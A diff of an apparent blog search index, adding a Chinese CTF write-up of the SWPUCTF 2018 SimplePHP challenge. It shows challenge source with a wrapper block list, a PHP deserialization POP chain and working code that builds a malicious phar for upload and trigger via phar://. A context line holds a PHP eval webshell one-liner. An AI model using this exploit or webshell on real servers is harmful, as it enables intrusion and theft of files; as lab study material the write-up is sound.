@@ -614,8 +614,39 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 ]]></content>
   </entry>
   <entry>
-    <title>pla</title>
+    <title>phar练习</title>
     <url>/2022/12/02/pla/</url>
-    <content><![CDATA[<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2>]]></content>
+    <content><![CDATA[<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>1.打开源代码</p>
+<p>观察到flag在f1ag.php</p>
+<p>2.使用file.php?file&#x3D;读一下index.php file.php</p>
+<p>发现文件</p>
+<p> ‘function.php’;<br>‘class.php’; </p>
+<p>未发现unserialize（）猜测使用phar:&#x2F;&#x2F;.&#x2F;进行反序列化</p>
+<p>发现’class.php’; 中含有$text &#x3D; base64_encode(file_get_contents($value));</p>
+<p>猜测使用class.php进行反序列化操作</p>
+<p>构造pop链</p>
+<ol start="3">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#class.php</span><br><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>根据提示，在第一个类中销毁的时候会echo $this-&gt;test;而$this-&gt;test &#x3D; $this-&gt;str;</p>
+<p> 因为$this-&gt;source &#x3D; $file，所有将在第二个类中使用tostring作为pop链的一部分</p>
+<p>将 $this-&gt;str;指向new Show来调用tostring方法实现&#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg</p>
+<p>要在第三个类中使用$text &#x3D; base64_encode(file_get_contents($value));</p>
+<p>必须使得isset($this-&gt;params[$key]不为空，则应该调用__get()方法</p>
+<p>将new Test赋给$this-&gt;str[‘str’]</p>
+<p>可以get resource</p>
+<p> 因为$value &#x3D; $this-&gt;params[$key]</p>
+<p>使得params[‘resource’]&#x3D;文件路径</p>
+<p>然后生成phar文件</p>
+<p>路径</p>
+<p>class C1e4r::__destruct() &#x3D;&gt; class Show::__toString() &#x3D;&gt; class Test::__get()、get()、file_get()</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;//!!new show</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;        //!!new Test</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c=new C1e4r();</span><br><span class="line">$s=new Show();</span><br><span class="line">$t=new Test();</span><br><span class="line"></span><br><span class="line">$c-&gt;str=$s;</span><br><span class="line">$s-&gt;str[&#x27;str&#x27;]=$t;</span><br><span class="line">$t-&gt;params[&#x27;source&#x27;]=&#x27;/var/www/html/f1ag.php&#x27;;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;test.phar&quot;); </span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($c); </span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>4.生成文件之后</p>
+<p>将文件格式改为jpg，上传</p>
+<p>使用phar:&#x2F;&#x2F;.&#x2F;upload&#x2F;文件名</p>
+]]></content>
   </entry>
 </search>
